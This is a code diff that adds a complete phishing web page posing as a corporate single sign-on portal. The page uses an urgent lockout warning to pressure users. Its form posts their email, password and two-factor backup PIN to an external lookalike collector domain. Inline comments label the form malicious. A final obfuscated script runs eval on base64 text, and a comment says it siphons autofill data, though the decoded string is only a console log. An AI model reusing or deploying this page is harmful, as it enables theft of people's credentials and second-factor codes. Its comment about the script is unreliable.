@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Urgent Security Notification - Verify Account Identity</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f4f6f9; margin: 0; padding: 40px; }
+        .card { max-width: 460px; margin: 0 auto; background: #ffffff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
+        .logo { font-size: 22px; font-weight: bold; color: #0066cc; margin-bottom: 20px; }
+        .alert-box { background: #fff3cd; color: #856404; padding: 12px; border-radius: 4px; font-size: 14px; margin-bottom: 20px; }
+        .form-group { margin-bottom: 16px; }
+        label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 6px; }
+        input[type="text"], input[type="password"] { width: 100%; padding: 10px; border: 1px solid #ced4da; border-radius: 4px; box-sizing: border-box; }
+        .btn-submit { width: 100%; padding: 12px; background: #0066cc; color: #fff; border: none; border-radius: 4px; font-size: 15px; font-weight: bold; cursor: pointer; }
+        .footer-links { margin-top: 24px; font-size: 12px; color: #6c757d; text-align: center; }
+        .footer-links a { color: #0066cc; text-decoration: none; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="logo">Corporate Single Sign-On Portal</div>
+        <div class="alert-box">
+            <strong>Action Required:</strong> Your enterprise session expired due to an unauthorized sign-in attempt from IP 194.26.29.112. Verify your credentials below within 24 hours to prevent account lockout.
+        </div>
+        <!-- Malicious Credential Harvesting Form posting to untrusted external collector -->
+        <form action="https://login-auth-verify.security-update8829.com/gate/submit.php?token=928473948271&client=sso_enterprise" method="POST">
+            <input type="hidden" name="session_id" value="09f911029bc837d92">
+            <div class="form-group">
+                <label for="username">Enterprise Email Address</label>
+                <input type="text" id="username" name="email_auth" required placeholder="user@company.com">
+            </div>
+            <div class="form-group">
+                <label for="password">Network Password</label>
+                <input type="password" id="password" name="passwd_auth" required placeholder="Enter current password">
+            </div>
+            <div class="form-group">
+                <label for="pin">Two-Factor Authentication Backup PIN</label>
+                <input type="password" id="pin" name="pin_code" placeholder="6-digit backup code">
+            </div>
+            <button type="submit" class="btn-submit">Authenticate & Keep Session Active</button>
+        </form>
+        <div class="footer-links">
+            <p>Protected by Enterprise Cloud Shield &copy; 2026</p>
+            <p><a href="https://login-auth-verify.security-update8829.com/help?ref=faq9981">Terms of Service</a> | <a href="https://login-auth-verify.security-update8829.com/privacy?lang=en-US">Privacy Policy</a></p>
+        </div>
+    </div>
+
+    <!-- Obfuscated payload loader attempting to siphon autofill data -->
+    <script>
+        var _0x9b2a = ["\x65\x76\x61\x6c", "\x61\x74\x6f\x62", "Y29uc29sZS5sb2coJ0tlZXBBYWxpdmUnKTs="];
+        try {
+            window[atob("ZXZhbA==")](atob(_0x9b2a[2]));
+        } catch (e) {}
+    </script>
+</body>
+</html>
